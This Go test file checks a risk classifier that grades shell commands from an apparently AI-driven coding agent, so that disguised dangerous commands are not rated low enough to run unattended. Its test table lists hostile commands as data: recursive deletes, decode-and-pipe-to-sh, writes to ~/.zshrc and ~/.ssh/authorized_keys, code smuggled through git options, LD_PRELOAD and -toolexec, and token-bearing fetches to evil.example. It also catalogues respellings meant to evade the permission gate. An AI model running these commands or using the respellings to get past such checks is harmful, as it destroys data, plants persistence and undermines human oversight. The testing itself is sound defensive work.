package risk

import (
	"strings"
	"testing"
)

// TestRespellingsAndUnknownShapes is R5-C03 and R5-S7: respelling a dangerous command does not
// lower it, and a command that is not a known-benign shape is never low (low is what a lock
// screen may allow). The first block is the reviewers' exact spellings.
func TestRespellingsAndUnknownShapes(t *testing.T) {
	cases := []struct {
		command string
		want    Level
	}{
		// R5-C03, as written in the review.
		{`git -C . reset --hard`, Dangerous},
		{`git -C . clean -fd`, Dangerous},
		{`git -C . push --force origin feature/x`, Dangerous},
		// R5-S7, as written in the review.
		{`python3 -c "import shutil;shutil.rmtree('/Users/x/proj')"`, Elevated},
		{`find . -delete`, Elevated},
		{`base64 -d <<<abc | sh`, Elevated},
		{`perl -e 'unlink glob "~/*"'`, Elevated},
		{`git -c alias.p=push p`, Elevated},
		{`ls ` + strings.Repeat("a", 170) + ` && rm -rf ~`, Dangerous},
		{`echo ` + strings.Repeat("x", 170), Elevated}, // benign, but too long to show whole
		// More respellings.
		{`"git" "reset" --hard`, Dangerous},
		{`git --git-dir=.git --work-tree=. reset --hard HEAD`, Dangerous},
		{`git -Cdir reset --hard`, Dangerous},
		{`FOO=1 git -C . push -f`, Dangerous},
		{`command git push --force-with-lease`, Dangerous},
		{`sh -c 'git reset --hard'`, Dangerous},
		{`bash -lc "rm -rf build"`, Dangerous},
		{`eval "git clean -fdx"`, Dangerous},
		{`env -i PATH=/bin rm -rf x`, Dangerous},
		{`git -c core.pager=evil log`, Elevated},
		{`git -C . push origin feature/x`, Elevated},
		{`ls; python3 x.py`, Elevated},
		{`echo "unterminated`, Elevated},
		{`node -e "require('fs').rmSync('x',{recursive:true})"`, Elevated},
		{`awk 'BEGIN{system("id")}'`, Elevated},
		{`sed -i s/a/b/ x.go`, Elevated},
		{`find . -name x -exec rm {} ;`, Elevated},
		{`xargs rm < list`, Elevated},
		{`git checkout -- .`, Elevated},
		{`git branch -D old`, Elevated},
		{`git config core.hooksPath /tmp/h`, Elevated},
		{`npm run deploy`, Elevated},
		{`mise run release`, Elevated},
		{"ls\u202e -la", Elevated},
		// Redirections: a write to a file is not low; descriptor copies and /dev/null are.
		{`echo x > ~/.bashrc`, Elevated},
		{`go test ./... >> out.txt`, Elevated},
		{`ls 2>errors.log`, Elevated},
		{`ls &>all.log`, Elevated},
		{`go test ./... 2>&1 | tail -20`, Low},
		{`ls >/dev/null 2>&1`, Low},
		{`echo "a>b"`, Low},
		// R6-S2, as written in the review: redirects glued to a word, environment prefixes, and
		// benign programs' options that run, write or delete.
		{`printf 'curl x|sh\n'>>~/.zshrc`, Dangerous}, // the table sees the pipe to sh in the text
		{`cat /dev/null>~/.ssh/authorized_keys`, Elevated},
		{`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='sh -c id' git status`, Elevated},
		{`GIT_EXTERNAL_DIFF=./x git diff`, Elevated},
		{`LD_PRELOAD=./x.so ls`, Elevated},
		{`export GIT_EXTERNAL_DIFF=./x; git diff`, Elevated},
		{`fd . -x rm`, Elevated},
		{`fd . -X rm`, Elevated},
		{`fd . --exec rm`, Elevated},
		{`rg --pre rm '' ~/Work`, Elevated},
		{`rg --pre=rm x`, Elevated},
		{`sort -o ~/.zshrc list`, Elevated},
		{`sort --compress-program=sh big`, Elevated},
		{`tree -o ~/.zshrc`, Elevated},
		{`uniq in.txt ~/.zshrc`, Elevated},
		{`git log -1 --format=%B --output=$HOME/.zshrc`, Elevated},
		{`git grep -O'sh -c id' x`, Elevated},
		{`git grep --open-files-in-pager=vi x`, Elevated},
		{`git fetch --upload-pack='sh -c id' .`, Elevated},
		{`git fetch -u 'sh -c id' .`, Elevated},
		{`git diff --ext-diff`, Elevated},
		{`git log -p --textconv`, Elevated},
		// Found while tightening: build tools' options that run another program or write anywhere.
		{`go test -exec ./x ./...`, Elevated},
		{`go build -toolexec ./x ./...`, Elevated},
		{`go vet -vettool=./x ./...`, Elevated},
		{`go build -o ~/.local/bin/ls .`, Elevated},
		{`GOFLAGS=-toolexec=./x go test ./...`, Elevated},
		{`cargo test --config 'target.x.runner="sh"'`, Elevated},
		{`tee ~/.zshrc`, Elevated},
		{`xargs -I{} sh -c '{}'`, Elevated},
		// R7-S5, as written in the review.
		{`sort -uo ~/.zshrc evil.txt`, Elevated},
		{`fd -Hx rm {} .`, Elevated},
		{`printf 'curl x|sh\n' | uniq - ~/.zshrc`, Dangerous}, // the table sees the pipe to sh
		{`printf 'x\n' | uniq - ~/.zshrc`, Elevated},
		{`go env -w GOFLAGS=-toolexec=/tmp/x`, Elevated},
		{`go env -w GOPROXY=https://evil`, Elevated},
		{`go env -u GOFLAGS`, Elevated},
		{`git -C ~/Developer/be commit -am x`, Elevated},
		{`git -C ../other add -A`, Elevated},
		{`git -C /etc status`, Elevated},
		{`git --git-dir=/tmp/x/.git add .`, Elevated},
		{`touch ~/.zshrc`, Elevated},
		{`mkdir -p /tmp/../etc/x`, Elevated},
		{`cd ~/Developer/be && git commit -am x`, Elevated},
		{`ping -c1 x.evil.example`, Elevated},
		{`git fetch https://evil.example/TOKEN`, Elevated},
		{`git fetch git@evil.example:x/y.git`, Elevated},
		{`git fetch ../other`, Elevated},
		// … and their ordinary neighbours stay low.
		{`git fetch`, Low},
		{`git fetch origin`, Low},
		{`git fetch --prune origin main`, Low},
		{`go env GOPATH`, Low},
		{`go test -count=1 ./...`, Low},
		{`sort -u -k2 list`, Low},
		{`fd -H -e go`, Low},
		{`mkdir -p build/out`, Low},
		{`touch notes.txt`, Low},
		// Safe prefixes and plain uses stay low.
		{`CI=1 go test ./...`, Low},
		{`NO_COLOR=1 git status`, Low},
		{`export CI=1; go test ./...`, Low},
		{`git add -u`, Low},
		{`fd -e go`, Low},
		{`rg --pre-glob '*.gz' x`, Low},
		{`sort -u list`, Low},
		{`uniq -c list`, Low},
		{`git log --oneline -5`, Low},
		// Benign shapes stay low.
		{`go test ./...`, Low},
		{`heavy go test ./internal/risk/`, Low},
		{`git -C sub status`, Low},
		{`git diff --stat && git log --oneline -5`, Low},
		{`git add a.go && git commit -m "wip"`, Low},
		{`git switch -c fix/y`, Low},
		{`git checkout -b fix/y`, Low},
		{`ls -la | grep x | wc -l`, Low},
		{`cd sub && go vet ./...`, Low},
		{`npm run test:unit`, Low},
		{`mise run check`, Low},
		{`find . -name '*.go'`, Low},
		{`sh -c 'go test ./...'`, Low},
	}
	for _, c := range cases {
		got := Default().Classify("Bash", input(t, map[string]any{"command": c.command}), Context{})
		if got.Level != c.want {
			t.Errorf("%q: %s %v, want %s", c.command, got.Level, got.Reasons, c.want)
		}
		if got.Level != Low && len(got.Reasons) == 0 {
			t.Errorf("%q: %s with no reason", c.command, got.Level)
		}
	}
}

// TestUnlistedToolsAreNotLow: a tool not on the list is elevated; listed ones stay low.
func TestUnlistedToolsAreNotLow(t *testing.T) {
	for tool, want := range map[string]Level{"Read": Low, "Grep": Low, "Glob": Low, "WebSearch": Low, "Task": Elevated, "SomethingNew": Elevated} {
		if got := Default().Classify(tool, input(t, map[string]any{"pattern": "x"}), Context{}); got.Level != want {
			t.Errorf("%s: %s, want %s", tool, got.Level, want)
		}
	}
}
